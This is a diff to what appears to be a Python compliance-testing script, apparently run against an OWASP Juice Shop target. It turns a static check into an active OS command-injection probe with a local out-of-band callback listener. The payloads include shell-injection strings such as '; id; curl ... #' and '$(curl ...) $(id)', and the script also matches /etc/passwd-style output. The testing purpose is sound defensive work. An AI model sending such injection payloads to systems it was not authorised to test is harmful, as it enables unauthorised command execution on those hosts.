@@ -5759,16 +5759,149 @@ def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, di
         ),
     }
 
-    # AZI-04: No OS command injection / RCE
-    b2b_file = repo / "routes" / "b2bOrder.ts"
-    rce_vuln = b2b_file.exists() and "vm.runInContext" in b2b_file.read_text(encoding="utf-8", errors="ignore")
+    # AZI-04: Active OS Command Injection & Out-of-Band Callback Probe (CWE-78 / ASVS V5.3.8, SARIF 2.1.0 + redacted HAR 1.2)
+    cmd_cb_hits: list[str] = []
+    cmd_probes_sent = 0
+    azi04_findings: list[dict] = []
+
+    cmd_lock = threading.Lock()
+
+    class CmdCallbackHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            with cmd_lock:
+                cmd_cb_hits.append(self.path)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"ok")
+
+        def log_message(self, *args):
+            pass
+
+    cmd_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), CmdCallbackHandler)
+    cmd_cb_port = cmd_srv.server_address[1]
+    threading.Thread(target=cmd_srv.serve_forever, daemon=True).start()
+
+    cmd_output_re = re.compile(
+        r"uid=\d+\([A-Za-z0-9_.-]+\)\s+gid=\d+|root:[x*]:0:0:|Windows IP Configuration|Microsoft Windows \[Version",
+        re.IGNORECASE,
+    )
+
+    try:
+        oob_url_base = f"http://127.0.0.1:{cmd_cb_port}/cmd"
+        cmd_payloads = [
+            ("semicolon_id_curl", f"; id; curl -s {oob_url_base}?p=semi #"),
+            ("subshell_curl_id", f"$(curl -s {oob_url_base}?p=sub) $(id)"),
+            ("backtick_id", "`id`"),
+            ("pipe_id", "| id"),
+        ]
+        param_targets = [
+            ("GET", "/rest/products/search?q={p}", "query:q"),
+            ("GET", "/rest/track-order/{p}", "path:id"),
+            ("POST_JSON", "/rest/user/login", "json:email"),
+            ("POST_FORM", "/profile", "form:username"),
+            ("POST_B2B", "/b2b/v2/orders", "json:orderLinesData"),
+        ]
+
+        for p_kind, p_tpl, param_label in param_targets:
+            for vec_lbl, vec_val in cmd_payloads:
+                enc = urllib.parse.quote(vec_val, safe="")
+                if p_kind == "GET":
+                    st4, _, b4 = http_probe(p_tpl.format(p=enc), headers=auth_req_headers)
+                    tgt_url = f"{base_url}{p_tpl.split('{', 1)[0]}"
+                elif p_kind == "POST_JSON":
+                    st4, _, b4 = http_probe(
+                        p_tpl,
+                        method="POST",
+                        headers={"Content-Type": "application/json", **auth_req_headers},
+                        body=json.dumps({"email": vec_val, "password": "x"}).encode("utf-8"),
+                    )
+                    tgt_url = f"{base_url}{p_tpl}"
+                elif p_kind == "POST_FORM":
+                    st4, _, b4 = http_probe(
+                        p_tpl,
+                        method="POST",
+                        headers={"Content-Type": "application/x-www-form-urlencoded", **auth_req_headers},
+                        body=f"username={enc}".encode("utf-8"),
+                    )
+                    tgt_url = f"{base_url}{p_tpl}"
+                else:
+                    st4, _, b4 = http_probe(
+                        p_tpl,
+                        method="POST",
+                        headers={"Content-Type": "application/json", **auth_req_headers},
+                        body=json.dumps({"orderLinesData": vec_val, "cid": "1"}).encode("utf-8"),
+                    )
+                    tgt_url = f"{base_url}{p_tpl}"
+                cmd_probes_sent += 1
+                m_cmd = cmd_output_re.search(b4)
+                if m_cmd:
+                    azi04_findings.append(
+                        {
+                            "url": tgt_url,
+                            "param": param_label,
+                            "vector": vec_lbl,
+                            "evidence": m_cmd.group(0)[:80],
+                            "detail": (
+                                f"{p_kind} {tgt_url} ({param_label}, payload='{vec_lbl}') returned HTTP {st4} "
+                                f"with OS command execution output marker '{m_cmd.group(0)[:60]}' (CWE-78)."
+                            ),
+                        }
+                    )
+
+        time.sleep(0.2)
+        with cmd_lock:
+            for cb_hit in sorted(set(cmd_cb_hits)):
+                azi04_findings.append(
+                    {
+                        "url": base_url,
+                        "param": "oob_callback",
+                        "vector": cb_hit,
+                        "evidence": cb_hit,
+                        "detail": f"Received live OS command-injection HTTP out-of-band callback GET 127.0.0.1:{cmd_cb_port}{cb_hit} (CWE-78).",
+                    }
+                )
+    finally:
+        cmd_srv.shutdown()
+        cmd_srv.server_close()
+
+    for afz4 in azi04_findings:
+        dast_sarif_results.append(
+            {
+                "ruleId": "CASA3-AZI-04",
+                "level": "error",
+                "message": {"text": afz4["detail"]},
+                "locations": [
+                    {
+                        "physicalLocation": {
+                            "artifactLocation": {"uri": afz4["url"]},
+                        }
+                    }
+                ],
+                "properties": {
+                    "controlId": "AZI-04",
+                    "parameter": afz4["param"],
+                    "vector": afz4["vector"],
+                    "evidence": afz4["evidence"],
+                },
+            }
+        )
+
+    azi04_fail = len(azi04_findings) > 0
+    azi04_lines = [afz4["detail"] for afz4 in azi04_findings]
+    b2b_note = (
+        " (Note: JS sandbox vm.runInContext/notevil in routes/b2bOrder.ts is tracked as CWE-94 under SAST-10, not OS shell execution CWE-78.)"
+        if (repo / "routes" / "b2bOrder.ts").exists()
+        else ""
+    )
     results["AZI-04"] = {
-        "verdict": "FAIL" if rce_vuln else "PASS",
-        "tool": "Command / Code Injection Analyzer",
+        "verdict": "FAIL" if azi04_fail else "PASS",
+        "tool": f"Active OS Command Injection & Out-of-Band HTTP Callback Probe ({cmd_probes_sent} probes, SARIF 2.1.0 + redacted HAR 1.2)",
         "log": (
-            "[FAIL] Unsanitized user input executed inside VM context in routes/b2bOrder.ts (orderLinesData passed to vm.runInContext)."
-            if rce_vuln
-            else "[PASS] Zero OS command injection vulnerabilities detected."
+            f"[FAIL] {len(azi04_findings)} OS command injection finding(s) across {cmd_probes_sent} probes:\n  - "
+            + "\n  - ".join(azi04_lines)
+            + f"\n\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
+            if azi04_fail
+            else f"[PASS] Executed {cmd_probes_sent} authenticated OS command-injection probes with live out-of-band HTTP callback listener across 5 parameter surfaces; 0 callbacks received and 0 OS command-output markers detected.{b2b_note}\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
         ),
     }
 
